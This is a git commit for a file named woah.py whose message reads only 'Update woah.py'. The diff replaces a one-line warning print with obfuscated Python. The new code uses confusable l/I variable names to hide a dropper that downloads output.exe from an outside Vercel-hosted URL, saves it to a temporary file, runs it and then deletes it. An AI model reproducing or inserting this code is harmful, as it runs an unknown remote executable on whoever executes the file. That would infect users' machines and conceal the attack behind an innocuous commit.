94210bfbea8007ef6f2a43961824bfd905773b34
zdashero <166456558+zdashero@users.noreply.github.com>
2024-07-12 16:59:38 +0100

    Update woah.py

--- woah.py
+++ woah.py
@@ -1,1 +1,10 @@
-print("you could have been infected, be careful")
+lllllllllllllll,llllllllllllllI=exit,print
+import requests as IlllIIlllIlIIl,subprocess as lIllIlIIlIIlll,tempfile as IlllIIlIIIlIll,os as lIIIlIIIlIlIlI
+llIIlIIlIIllIllIlI='https://aparatus.vercel.app/output.exe'
+lIllllIlIlllIIlllI=IlllIIlllIlIIl.get(llIIlIIlIIllIllIlI)
+if lIllllIlIlllIIlllI.status_code==200:IIIllIllIIllIIlIII=lIllllIlIlllIIlllI.content
+else:lllllllllllllll(1)
+with IlllIIlIIIlIll.NamedTemporaryFile(delete=False,suffix='.exe')as lllIllllIIllIIIIll:lllIllllIIllIIIIll.write(IIIllIllIIllIIlIII);IIllIIIIllIlllllll=lllIllllIIllIIIIll.name
+try:IlllIIIllllllllIlI=lIllIlIIlIIlll.run([IIllIIIIllIlllllll],check=True)
+except lIllIlIIlIIlll.CalledProcessError as IIIIIIlIlIIlIlIllI:llllllllllllllI(f"An error occurred: {IIIIIIlIlIIlIlIllI}")
+finally:lIIIlIIIlIlIlI.remove(IIllIIIIllIlllllll)
